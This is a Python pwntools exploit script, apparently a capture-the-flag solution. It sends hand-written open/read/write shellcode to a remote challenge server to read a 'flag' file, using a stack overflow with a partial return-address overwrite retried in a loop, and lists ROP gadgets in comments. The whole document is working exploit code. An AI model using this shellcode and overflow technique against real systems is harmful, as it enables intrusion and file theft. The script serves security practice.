from pwn import *
from LibcSearcher import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h', '-p', '63', '-F' '#{pane_pid}', '-P']

sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda x,y:p.sendafter(x,y)
sla=lambda x,y:p.sendlineafter(x,y)
rc=lambda x:p.recv(x)
rl=lambda :p.recvline()
ru=lambda x:p.recvuntil(x)
ita=lambda :p.interactive()
slc=lambda :asm(shellcraft.sh())
uu64=lambda x:u64(x.ljust(8,b'\0'))
uu32=lambda x:u32(x.ljust(4,b'\0'))
def gdba(x=''):
	if type(p)==pwnlib.tubes.remote.remote:
		return
	elif type(p)==pwnlib.tubes.process.process:
		# gdb.attach(p,x)
		gdb.attach(proc.pidof(p)[0])
		pause()
while True:
	# p=process('./shellcode')
	p=remote('39.100.87.38',27158)
	shellcode = asm('''
			mov edx,0x67616c66
			push rdx   
			mov rdi,rsp
			xor esi,esi
			mov eax,2
			syscall
			mov edi,eax
			mov rsi,rsp
			xor eax,eax
			syscall
			xor edi,2
			mov eax,edi
			syscall   #write(1,buf,n)
		
		''')
	print(hex(len(shellcode)))
	# shellcode+=b'\xe8\xf3\xfd\xff\xff'
	print(hex(len(shellcode)))
	leave_ret=0x000000000040074b
	ret=0x000000000040053e
	pop_rsp_r13_r14_r15_ret=0x000000000040085d
	pop_rbp=0x00000000004005f8
	vul=0x400760
	haha=0x400781
	jup_rsp=0x400785

	# gdba('b *0x00000000004007EE')
	ru(b'me?\n')
	payload=shellcode
	payload+=b'\x00'*(0x28-len(payload))+p64(ret)+p8(0x90)+p8(0x53)

	sd(payload)
	try:
		rc(0x20)
	except EOFError:     
		p.close()
		continue
	else:
		ita()
		break

# p=remote()


# ============================================================
# 0x000000000040074b : leave ; ret
# 0x000000000040085c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040085e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000400860 : pop r14 ; pop r15 ; ret
# 0x0000000000400862 : pop r15 ; ret
# 0x000000000040085b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040085f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x00000000004005f8 : pop rbp ; ret
# 0x0000000000400863 : pop rdi ; ret
# 0x0000000000400861 : pop rsi ; pop r15 ; ret
# 0x000000000040085d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040053e : ret
# 0x0000000000400542 : ret 0x200a
# 0x0000000000400735 : ret 0x2be
# 0x0000000000400285 : ret 0xe6c2